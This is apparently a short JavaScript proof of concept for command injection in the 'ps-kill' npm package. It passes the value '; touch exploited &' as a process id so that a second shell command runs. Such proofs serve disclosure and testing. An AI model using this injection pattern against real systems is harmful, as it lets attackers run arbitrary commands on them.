
const pkg = require('ps-kill');

const pid = "; touch exploited &";

pkg.kill(pid);